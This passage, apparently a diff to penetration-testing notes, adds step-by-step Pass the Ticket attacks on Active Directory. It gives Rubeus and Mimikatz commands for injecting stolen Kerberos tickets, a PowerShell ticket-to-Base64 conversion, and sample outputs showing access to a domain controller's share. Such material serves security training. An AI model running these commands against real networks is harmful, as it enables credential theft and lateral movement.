@@ -4369,6 +4369,225 @@ To learn more about the difference between Mimikatz sekurlsa::pth and Rubeus ask
 
 </details>
 
+<details>
+<summary><h4>Pass the Ticket (PtT)</h4></summary>
+
+Now that we have some Kerberos tickets, we can use them to move laterally within an environment.
+
+<details>
+<summary><h5>Rubeus - Pass the Ticket (OPTION 1)</h4></summary>
+
+After executing an OverPass‑the‑Hash attack, you may obtain the resulting ticket in Base64 format. Rather than manually exporting and importing it, you can use the */ptt* flag to automatically inject that ticket—whether it's a **TGT** or a **TGS**—into the current logon session.
+
+```cmd
+Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /rc4:<HASH> /ptt
+```
+
+Expected output
+
+```cmd
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: <HASH>
+[*] Building AS-REQ (w/ preauth) for: '<DOMAIN>\<USER>'
+[+] TGT request successful!
+[*] Base64(ticket.kirbi):
+      <BASE64 TICKET>
+[+] Ticket successfully imported!
+
+  ServiceName           :  krbtgt/<DOMAIN>
+  ServiceRealm          :  <DOMAIN>
+  UserName              :  <USER>
+  UserRealm             :  <DOMAIN>
+  StartTime             :  7/12/2025 12:27:47 PM
+  EndTime               :  7/12/2025 10:27:47 PM
+  RenewTill             :  7/19/2025 12:27:47 PM
+  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType               :  rc4_hmac
+  Base64(key)           :  PRG0wMmc4OznDz1YIAjdsA==
+```
+
+Note that now it displays `Ticket successfully imported!`.
+
+</details>
+
+<details>
+<summary><h5>Rubeus - Pass the Ticket (OPTION 2)</h5></summary>
+
+Another way is to import the ticket into the current session using the .kirbi file from the disk.
+
+
+**Use a ticket exported from Mimikatz and import it using Pass the Ticket:**
+
+```cmd
+Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-<USER>@krbtgt-<DOMAIN>.kirbi
+```
+
+**Expected output:**
+
+```cmd
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.5.0
+
+
+[*] Action: Import Ticket
+[+] ticket successfully imported!
+```
+
+**Verify that your ticket let you access DC01’s filesystem:**
+
+```cmd
+dir \\DC01.<DOMAIN>\c$
+```
+
+**Expected output:**
+
+```cmd
+Directory: \\dc01.<DOMAIN>\c$
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         6/4/2025  11:17 AM                Program Files
+d-----         6/4/2025  11:17 AM                Program Files (x86)
+...
+```
+
+</details>
+
+<details>
+<summary><h5>Rubeus - Pass the Ticket (OPTION 3)</h5></summary>
+
+We can also use the Base64 output from Rubeus or convert a .kirbi to Base64 to perform the Pass the Ticket attack. 
+
+**Use PowerShell to convert a .kirbi to Base64:**
+
+```powershell
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-<USER>@krbtgt-<DOMAIN>.kirbi"))
+```
+
+**Expected output:**
+
+```cmd
+<BASE64_TICKET>
+```
+
+**Using Rubeus, provide the Base64 string instead of the file name:**
+
+```cmd
+Rubeus.exe ptt /ticket:<BASE64_TICKET>
+```
+
+**Expected output:**
+
+```cmd
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.5.0
+
+
+[*] Action: Import Ticket
+[+] ticket successfully imported!
+```
+
+**Verify that your ticket let you access DC01’s filesystem:**
+
+```cmd
+dir \\DC01.<DOMAIN>\c$
+```
+
+**Expected output:**
+
+```cmd
+Directory: \\dc01.<DOMAIN>\c$
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         6/4/2025  11:17 AM                Program Files
+d-----         6/4/2025  11:17 AM                Program Files (x86)
+...
+```
+
+</details>
+
+<details>
+<summary><h5>Mimikatz - Pass the Ticket</h5></summary>
+
+We can also perform the **Pass the Ticket** attack using the Mimikatz module `kerberos::ptt` and the `.kirbi` file that contains the ticket we want to import.
+
+**Start Mimikatz as Adminitrator**
+
+```cmd
+mimikatz.exe
+```
+
+**Perform the Pass the Ticket attack**
+
+```cmd
+mimikatz # privilege::debug
+mimikatz # kerberos::ptt "C:\Users\<USER>\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-<USER>@krbtgt-<DOMAIN>.kirbi"
+mimikatz # exit
+```
+
+**Verify that your ticket let you access DC01’s filesystem:**
+
+```cmd
+dir \\DC01.<DOMAIN>\c$
+```SS
+
+**Expected output:**
+
+```cmd
+Directory: \\dc01.<DOMAIN>\c$
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         6/4/2025  11:17 AM                Program Files
+d-----         6/4/2025  11:17 AM                Program Files (x86)
+...
+```
+
+</details>
+
+</details>
+
+<details>
+<summary><h4>Pass The Ticket with PowerShell Remoting (Windows)</h4></summary>
+
+[PowerShell Remoting](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/running-remote-commands?view=powershell-7.5&viewFallbackFrom=powershell-7.2) enables administrators to execute scripts or manage commands remotely on Windows systems. It's powered by WinRM, which operates using the WS‑Management (WS‑Man) protocol and listens on two primary ports:
+
+* **TCP 5985 for HTTP**
+* **TCP 5986 for HTTPS (SSL/TLS-secured)**
+
+To initiate a PowerShell Remoting session on a remote system, a user must meet one of the following criteria:
+
+* Be a member of the local Administrators group
+* Belong to the Remote Management Users group
+* Have explicit permissions set on the session configuration within PowerShell
+
+Suppose we find a user account that doesn't have administrative privileges on a remote computer but is a member of the Remote Management Users group. In that case, we can use PowerShell Remoting to connect to that computer and execute commands.
+
+</details>
+
 </details>
 
 <details>
